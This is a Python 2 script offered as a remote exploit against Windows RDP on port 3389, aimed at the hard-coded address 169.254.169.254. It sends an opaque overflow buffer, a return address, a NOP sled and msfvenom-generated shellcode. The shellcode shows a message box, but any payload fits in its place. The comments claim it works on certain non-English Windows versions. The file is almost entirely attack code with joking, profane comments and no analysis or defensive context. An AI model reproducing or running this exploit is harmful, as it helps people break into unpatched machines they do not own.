import socket
# only working on non-English versions of Win7/08
# oddly only on CN XP/2003 too
target = '169.254.169.254'
buf = ("\x80\x8c\xd2\x02\x0d\x5b\xdc\xc8\x7b\x66" +
"\x74\x1e\xf2\xe4\x84\xe9\xc4\x0d\xd2\xfd" +
"\xe1\xa9\x55\x27\xb8\xdf\x56\xec\x9c\x50" +
"\x92\x20\x27\x20\x9e\x93\x26\x4d\x3d\xaf" +
"\xd0\x50\x8f\x72\xec\x6c\x7f\x21\xf9\xde" +
"\xd2\x7b\xad\xac\x91\xb7\x94\xed\x8c\x4b" +
"\xe5\x5e\x06\x65\x35\xf4\x07\x86\xda\x79" +
"\x54\x12\x53\xa3\x09\x7f\x56\x43\x5b\xc5" +
"\xb4\x3e\xc2\x45\x69\x38\x66\xe8\xb4\x6f" +
"\xd0\x32\x2e\x4e\xe5\xa2\x92\xf3\x2d\x3a" +
"\x96\x80\x3e\xa0\x5a\x3f\xef\xdf\x45\x29" +
"\x9f\xd5\x0d\x5c\x3a\xfc\x24\x46\x19\xcf" +
"\x90\xf0\x38\xdf\xc8\xcd\x86\x7a\x29\x16" +
"\x80\xf4\xc6\x5a\x21\xf5\x63\xa7\x49\x16" +
"\x1f\x3a\xe6\x7b\xc5\x63\x45\x05\x3b\xfc" +
"\x45\xf7\x9f\x7a\xbf\x36\x15\xca\xd6\x96" +
"\xa8\x8b\x70\x42\x49\x5b\x44\x17\x75\xc8" +
"\xa6\xeb\x4c\x18\xdd\x46\x2c\x66\x90\x04" +
"\x20\x58\x60\xdb\x50\xc9\x66\x5e\x11\xc1" +
"\x68\xec\x0e\xfa\x1e\x78\xc3\x17\x66\x40" +
"\xc8\x7a\x6e\x6c\x45\xde\x56\x80\x3e\x0b" +
"\xe1\x50\xeb\x04\xe8\x29\xa8\x66\xfa\xac" +
"\xe2\xfe\xed\x0f\x84\x76\x50\xd1\xc8\x62" +
"\x39\x44\x26\x31\x72\x5f\xc2\xf7\x30\xa6" +
"\x35\xc5\x91\x8a\x45\x61\x3b\xf2\x3c\xff" +
"\x6d\xfc\x07\x4f\x12\xc1\x42\xec\xdb\x0d" +
"\xdd\x2c\x3d\x74\xa9\xaa\x20\xb6\xc3\x01" +
"\x77\xc1\x7b\xe4\x93\xb1\xcb\xba\x43\x79" +
"\x67\x89\xa8\x7a\x87\x57\x8f\x3b\xb9\xe1" +
"\x26\x9b\xe7\xe8\x35\x23\xf5\x86\x68\xe7" +
"\xc0\xca\x15\xaa\x42\x05\x12\xd9\xad\xf4" +
"\xeb\x66\x7c\x43\xf1\x9a\x1f\xd5\xdb\xc5" +
"\xf7\x12\x41\x8a\x3b\x2a\xa5\x60\x8b\xf7" +
"\x4c\x93\x58\x34\x2e\x34\xc0\xd6\x87\x17" +
"\x78\x9d\xcb\x31\xc9\x7f\xd1\xc7\x99\xa0" +
"\xa7\x47\x94\xb0\x2c\xc3\x28\x95\x2f\x12" +
"\xb0\x52\x3c\x3d\x26\x9e\x01\x9c\x7a\x97" +
"\x55\xb6\xaa\xb2\x6e\x8c\x08\x8c\xfe\x2b" +
"\x23\x59\xb4\xb1\xcd\x1b\x55\x30\xb4\xbb" +
"\x04\x8b\x90\xa0\x43\x04\x50\x88\xb8\x9a" +
"\x80\x55\x9a\x27\x71\x61\xd1\x9f\x0a\x6c" +
"\xb0\x02\xf8\x05\xe4\x77\x20\x37\xf4\xca" +
"\x30\x49\xf7\x94\xd5\xa0\xc2\xbd\x4a\x11" +
"\x71\x7a\xb8\x61\xb0\xdf\x84\x0d\x07\x07" +
"\x5f\x24\x4b\x9c\xcf\x3d\x39\xf1\xc7\xd8" +
"\xe1\x79\x32\x4b\xd8\x0c\x1d\x48\xae\xc4" +
"\x1b\x40\xb4\x4d\x9a\x1d\x81\xdc\x36\x2a" +
"\xf0\xd9\x3f\x3b\x24\x23\x60\x92\x34\xc8" +
"\xc9\x03\x1e\xbd\x8b\x81\x6b\xc2\x7f\x4c" +
"\xc8\xb2\x3b\x45\x1f\x78\x10\x9d\x59\xbe" +
"\x7b\x4c\xd9\x1d\xae\xa5\xd2\x6b\xc6\x0f" +
"\xf2\x69\xe4\x00\xe6\xcf\x72\x89\x0c\x63" +
"\xb5\xf2\x4b\x43\x5a\xff\x65\x34\x6d\xe3" +
"\xfd\x58\xb8\xd4\xff\x1e\x08\xc4\x03\xc5" +
"\x5f\x7d\x9e\x78\xe7\x40\x0a\x3d\x23\x87" +
"\xaa\x2a\x32\x5a\x5d\x3a\x0b\xe8\x6b\xee" +
"\xc1\x87\x0d\xbc\x82\x43\xed\x27\x9e\xe5" +
"\x0d\x41\xeb\x22\x9c\x12\xb1\x43\x9e\x3b" +
"\xfd\xbd\x24\x3c\xc0\x61\xee\x0d\xb3\xd6" +
"\x2c\x6e\x7c\x33\xc4\x3f\x94\xdd\x9e\x06" +
"\xec\xd3\x93\xfa\xe9\x29\x3f\x5a\xb1\x41" +
"\xed\xcc\xd3\x40\x2c\x20\x40\x9f\x06\x08" +
"\x95\x2b\xa6\x00\x7d\x79\x6e\x1f\x09\xb9" +
"\x17\x1e\xd2\xc7\x05\xe7\xfa\xcd\x91\xcf" +
"\x9c\x63\x4f\x5a\xf1\xdb\x8b\xf3\xbc\x43" +
"\xab\x65\x98\xee\xbe\xbf\x93\xd9\x21\x34" +
"\x6b\xe1\xd7\x88\xba\x32\x97\x7d\x25\x24" +
"\xe1\x77\x7f\x37\xa0\xfd\xcb\xf0\x5b\xf4" +
"\x5b\xce\x82\x54\xfa\x2c\x8e\x8a\x01\x0f" +
"\xe9\x74\xd6\x3b\x12\xf5\xc9\x41\x8e\xe0" +
"\x65\xca\xd8\x12\x3b\xa5\x21\x49\x9c\x0a" +
"\x6a\x49\xcd\x81\xe6\x03\x4a\xc7\xcd\x4c" +
"\x60\x58\x01\x7f\xf2\x12\x9a\x81\x5e\x8a" +
"\xbe\x55\xec\x92\xc8\x1f\xa7\x3d\x33\x55" +
"\x93\x6d\x25\xf4\x0a\x6c\xe0\xa2\xf2\x56" +
"\xf3\x02\xdf\x0b\xcd\x26\xa3\xd4\x03\x19" +
"\x47\x19\x86\x10\xf9\x1d\x2f\x5e\x7d\x98" +
"\xd1\xfc\xc4\x2c\x6b\x9f\x24\xd5\x92\xb7" +
"\x95\xae\x67\x10\xb4\x65\x6c\x1a\x8e\x3c" +
"\x49\x46\x9f\xff\x6f\xf0\xae\x74\x17\x9c" +
"\xe8\x11\x47\x08\x4e\x53\x54\x8f\xda\x51" +
"\xeb\xeb\x26\x1d\x40\x6a\x70\x21\xdf\x02" +
"\xb9\x5d\x3f\xe4\x24\x7b\x7b\xa8\xd2\x90" +
"\x5b\x57\x31\x45\x32\x04\x9f\xca\x93\x95" +
"\xc1\xb9\x56\xc8\x41\xfd\xa4\x42\xae\x14" +
"\x6b\x65\xd3\x8e\x15\x13\xe5\x86\x32\x80" +
"\x64\xd5\x26\x56\x0c\x6c\x86\x21\xf6\xf2" +
"\xc1\xa3\x97\xb8\xa7\x8f\xeb\x5c\xf3\x68" +
"\x41\xf6\x21\xc8\xb3\x56\xb8\x1e\xfa\xd5" +
"\x65\xda\x31\x55\x7c\xde\xeb\x2e\xb8\x31" +
"\xa6\x39\xc9\x21\x64\x85\xdf\x0b\xb7\x64" +
"\xc8\xde\xe7\x99\x03\x55\xa6\x94\xe5\xe8" +
"\xfd\xbe\x06\x3c\x9d\x66\xfc\xe7\x03\x55" +
"\xd5\x53\xe4\xbb\xb8\xea\xb7\x94\x7a\xf2" +
"\xd3\x77\xcc\x17\xeb\xdf\x05\x3c\xeb\x05" +
"\xf9\xff\x8e\xb4\x6c\x86\xca\x26\x6c\x0b" +
"\xb9\x94\x65\x89\xf8\x21\xd7\xe6\xd4\x32" +
"\xc5\x52\x7d\xf7\x2e\xfd\x1a\x30\x19\x8e" +
"\x39\xb9\x86\x39\x37\xe6\xaf\xf0\x89\x59" +
"\xe3\x3a\x6c\x8f\xa0\xa4\x5a\xd9\xe4\x61" +
"\xf0\xf3\xda\x83\x09\x89\x43\x93\x24\x75" +
"\xbc\x07\xee\x0d\x7c\x60\xbb\xa6\x99\xd6" +
"\xec\x9d\x14\xa6\x79\x6a\x3a\x10\x3a\x18" +
"\x66\x2a\x72\x98\x73\x3c\x28\x6f\x02\x2d" +
"\x8e\x52\x16\x7b\xe6\x2c\x9f\xc7\x66\x8d" +
"\x13\x76\x1d\x3e\xe4\x05\xa1\x36\x40\x9c" +
"\x74\x3e\x86\x33\x5c\x35\x8e\xba\x88\x5a" +
"\x68\x54\x49\x24\x18\xc3\xe1\x3f\xdd\xa8" +
"\x7e\x97\xad\x64\x62\x9b\x6d\x3e\x2c\xf2" +
"\x54\xc2\x65\x34\x72\xb0\x7b\x6d\xc4\xf9" +
"\xe0\xed\x9d\x18\x8c\x02\x3b\x84\x58\xd9" +
"\xfa\x7f\xd0\x14\x41\xaa\xa5\x27\x91\xd0" +
"\xda\xda\x15\xdc\xa6\x61\x7a\xb9\xfd\x55" +
"\xed\x0b\xbe\xf8\x38\xf2\x17\xb6\x26\x86" +
"\xd0\x81\x22\x9e\x64\x7a\xf5\xe0\xd3\x40" +
"\x7f\xd7\x84\x45\x37\xa9\xa2\xc5\xd9\x2b" +
"\xf6\x7b\x8c\xcb\x17\xd9\x7f\xf3\xf5\x6d" +
"\xa4\x33\x9f\x37\xac\x99\x1e\x1d\xb3\x93" +
"\x58\x5d\x70\xae\xcd\xc5\xc3\x48\x56\x1c" +
"\x53\x88\xb4\x82\x17\x7e\xae\x02\xba\x48" +
"\xed\xf1\xa0\x10\xd6\x6e\x47\xb6\xb8\x15" +
"\x97\xe2\x1c\x72\xea\x08\x84\x38\x13\x67" +
"\xae\xb7\xa3\x5a\xe1\xd4\xdc\xee\x49\x26" +
"\x54\x50\xe4\xec\x98\xe9\xdd\xa9\xd6\xfd" +
"\x59\x25\x8c\xed\x15\x4b\x6b\x65\x40\xbb" +
"\xcd\xc6\x04\xb9\x80\x28\xba\xb1\x46\x59" +
"\x8a\x15\x4e\xe4\x96\x9b\xdf\x17\x82\x32" +
"\xd6\xcb\xdb\x53\x86\xc4\x2e\x78\xb4\x99" +
"\x4d\x97\x12\xd1\x0c\x4a\xc8\xe0\xba\xdc" +
"\x1e\xbb\x2a\xeb\x42\x65\x2e\xa0\x98\xdf" +
"\xd6\xa2\xe2\xd5\xff\x7d\xb2\x4f\xa3\x35" +
"\xf6\xdb\x3f\x54\xfb\xa6\x94\xe3\x5e\xa8" +
"\x2d\x40\x1e\xcd\xb9\x8d\x4d\x19\x42\xe8" +
"\xc2\x7a\x11\x66\xe4\x3f\xae\xd2\xce\xb9" +
"\xd9\x15\x58\x65\x86\x67\xa1\xd6\xf4\xe3" +
"\x84\x64\x15\x2c\xe4\x66\x17\x26\x4e\x95" +
"\xfd\x7a\x7e\xbf\xd4\x1d\x1c\x9f\x16\x45" +
"\x63\x15\xfc\x8a\xe1\xc6\xc7\x44\xf0\x32" +
"\xc8\xf0\xe6\xe3\xdc\x3c\xe7\x24\x25\x7c" +
"\x96\x5b\x00\x9e\x6c\xa7\x75\xd8\x67\x65" +
"\xc1\x23\x23\x15\x2a\x92\xff\xd3\xf2\x8b" +
"\x6e\x08\xff\x8e\x52\xcd\xd3\x02\x29\xa6" +
"\x68\xa8\xc4\x04\x6e\xe3\xb4\xcd\x1d\xc9" +
"\x64\x8c\x79\x8e\x5e\xf3\x5a\x1d\xfa\x02" +
"\x44\xa2\x0c\xbf\x5e\xad\x27\xbe\x84\x56" +
"\x8e\x36")
#msfvenom -p windows/messagebox TEXT="Patch Your Shit" -f python -v payload
payload =  ""
payload += "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
payload += "\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
payload += "\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
payload += "\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
payload += "\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
payload += "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
payload += "\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
payload += "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
payload += "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
payload += "\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
payload += "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
payload += "\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
payload += "\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
payload += "\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
payload += "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
payload += "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
payload += "\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f"
payload += "\x78\x58\x20\x68\x61\x67\x65\x42\x68\x4d\x65\x73"
payload += "\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x68\x69"
payload += "\x74\x58\x68\x75\x72\x20\x53\x68\x68\x20\x59\x6f"
payload += "\x68\x50\x61\x74\x63\x31\xc9\x88\x4c\x24\x0f\x89"
payload += "\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50"
payload += "\xff\x55\x08"
chacharealsmooth = '\x90' * 32 # slide to the left
exploit = buf + '\x30\x19\x22\x11' + chacharealsmooth + payload # criss cross

def gangshit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 3389))
    try: 
        s.send(exploit)
        print "[+] Check your shit" # everybody clap your hands
    except:
        print "[+] you fucked up"
    s.close()
 
if __name__ == "__main__":
    gangshit()